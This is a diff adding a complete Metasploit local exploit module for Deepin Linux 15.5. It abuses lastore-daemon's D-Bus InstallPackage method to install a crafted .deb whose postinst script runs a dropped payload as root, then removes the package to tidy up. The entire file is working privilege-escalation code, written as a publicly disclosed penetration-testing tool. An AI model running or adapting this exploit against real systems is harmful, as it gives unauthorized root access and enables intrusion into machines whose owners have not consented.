@@ -1,0 +1,172 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'lastore-daemon D-Bus Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Deepin Linux systems
+        by using lastore-daemon to install a package.
+
+        The lastore-daemon D-Bus configuration on Deepin Linux 15.5 permits any
+        user in the sudo group to install arbitrary system packages without
+        providing a password, resulting in code execution as root. By default,
+        the first user created on the system is a member of the sudo group.
+
+        This module has been tested successfully with lastore-daemon version
+        0.9.53-1 on Deepin Linux 15.5 (x64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          "King's Way",   # Discovery and exploit
+          'Brendan Coles' # Metasploit
+        ],
+      'DisclosureDate' => 'Feb 2 2016',
+      'References'     =>
+        [
+          [ 'EDB', '39433' ],
+          [ 'URL', 'https://gist.github.com/bcoles/02aa274ce32dc350e34b6d4d1ad0e0e8' ],
+        ],
+      'Platform'       => 'linux',
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'DefaultTarget'  => 0))
+    register_options([
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ])
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def mkdir(path)
+    vprint_status "Creating '#{path}' directory"
+    cmd_exec "mkdir -p #{path}"
+    register_dir_for_cleanup path
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def upload_and_chmodx(path, data)
+    upload path, data
+    cmd_exec "chmod +x '#{path}'"
+  end
+
+  def command_exists?(cmd)
+    cmd_exec("command -v #{cmd} && echo true").include? 'true'
+  end
+
+  def dbus_priv?
+    res = install_package '', ''
+    (res.include? 'DBus.Error.AccessDenied') ? false : true
+  end
+
+  def install_package(name, path)
+    dbus_send dest: 'com.deepin.lastore',
+              type: 'method_call',
+              path: '/com/deepin/lastore',
+              interface: 'com.deepin.lastore.Manager.InstallPackage',
+              contents: "string:'#{name}' string:'#{path}'"
+  end
+
+  def remove_package(name)
+    dbus_send dest: 'com.deepin.lastore',
+              type: 'method_call',
+              path: '/com/deepin/lastore',
+              interface: 'com.deepin.lastore.Manager.RemovePackage',
+              contents: "string:' ' string:'#{name}'"
+  end
+
+  def dbus_send(dest:, type:, path:, interface:, contents:)
+    cmd_exec "dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}"
+  end
+
+  def check
+    %w(lastore-daemon dpkg-deb dbus-send).each do |cmd|
+      unless command_exists? cmd
+        vprint_error "#{cmd} is not installed. Exploitation will fail."
+        return CheckCode::Safe
+      end
+      vprint_good "#{cmd} is installed"
+    end
+
+    unless dbus_priv?
+      vprint_error 'User is not permitted to install packages. Exploitation will fail.'
+      return CheckCode::Safe
+    end
+    vprint_good 'User is permitted to install packages'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    if check != CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    print_status 'Building package...'
+
+    payload_name = ".#{rand_text_alphanumeric rand(10..15)}"
+    payload_path = "#{base_dir}/#{payload_name}"
+    pkg_name = rand_text_alphanumeric rand(10..15)
+    pkg_path = "#{base_dir}/.#{pkg_name}"
+
+    mkdir "#{pkg_path}/DEBIAN"
+    pkg = "Package: #{pkg_name}\n"
+    pkg << "Version: 0.1\n"
+    pkg << "Maintainer: #{pkg_name}\n"
+    pkg << "Architecture: all\n"
+    pkg << "Description: #{pkg_name}\n"
+    upload "#{pkg_path}/DEBIAN/control", pkg
+    upload_and_chmodx "#{pkg_path}/DEBIAN/postinst", "#!/bin/sh\n#{payload_path} &"
+
+    cmd_exec "dpkg-deb --build '#{pkg_path}'"
+
+    unless file_exist? "#{pkg_path}.deb"
+      fail_with Failure::Unknown, 'Building package failed'
+    end
+
+    print_status 'Uploading payload...'
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    print_status 'Installing package...'
+    res = install_package pkg_name, "#{pkg_path}.deb"
+    vprint_line res
+
+    unless res.include? 'object path'
+      fail_with Failure::Unknown, 'Package installation failed. Check /var/log/lastore/daemon.log'
+    end
+
+    Rex.sleep 15
+
+    print_status 'Removing package...'
+    res = remove_package pkg_name.downcase
+    vprint_line res
+
+    unless res.include? 'object path'
+      print_warning 'Package removal failed. Check /var/log/lastore/daemon.log'
+    end
+  end
+end
